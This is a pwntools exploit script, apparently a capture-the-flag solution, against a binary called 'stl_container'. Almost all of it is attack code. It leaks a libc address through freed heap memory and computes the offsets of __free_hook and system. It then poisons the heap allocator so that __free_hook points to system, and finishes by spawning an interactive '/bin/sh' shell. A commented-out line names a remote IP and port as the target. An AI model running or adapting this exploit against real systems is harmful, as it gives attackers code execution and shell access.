from pwn import *

debug=0

#context.terminal = ['tmux','-x','sh','-c']
#context.terminal = ['tmux', 'splitw', '-h' ]
context.log_level='debug'
'''
if debug:
    p=process('./stl_container')
    #p=process('',env={'LD_PRELOAD':'./libc.so'})
    gdb.attach(p)
else:
    p=remote('134.175.239.26',8848)
'''
#p=remote('134.175.239.26',8848)
#p=process('./stl_container',env={'LD_PRELOAD':'./libc-2.27.so'})
p=process('./stl_container', env={'LD_PRELOAD':'./libc-2.23.so'})
#p=process('./stl_container')
def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)

def add(ty, content='a'):
    sl(str(ty))
    ru('3. show')
    ru('>>')
    sl('1')
    ru('input data:')
    se(content)
    ru('>>')

def delete(ty, idx=0):
    sl(str(ty))
    ru('3. show')
    ru('>>')
    sl('2')
    if ty <= 2:
        ru('index?')
        sl(str(idx))
    ru('>>')

def show(ty, idx=0):
    sl(str(ty))
    ru('3. show')
    ru('>>')
    sl('3')
    ru('index?\n')
    sl(str(idx))
    ru('data: ')
    data = ru('\n')
    ru('>>')
    return data


ru('>>')

add(1)
add(1)
add(2)
add(2)
add(4)
add(4)
add(3)
add(3)

delete(3)
delete(3)
delete(1)
delete(1)
delete(4)
delete(4)
delete(2)
data = show(2)
libc = u64(data[:6]+'\0\0')
base = libc - 0x3ebca0
free_hook = base + 0x3ed8e8
system = base + 0x4f440

add(3, '/bin/sh\0')
delete(2)
add(4)
add(2)
add(2)
add(3, '/bin/sh\0')
delete(2)
delete(2)
add(1, p64(free_hook))
add(1, p64(system))

sl('3')
ru('show')
sl('2')

print(hex(base))
p.interactive()

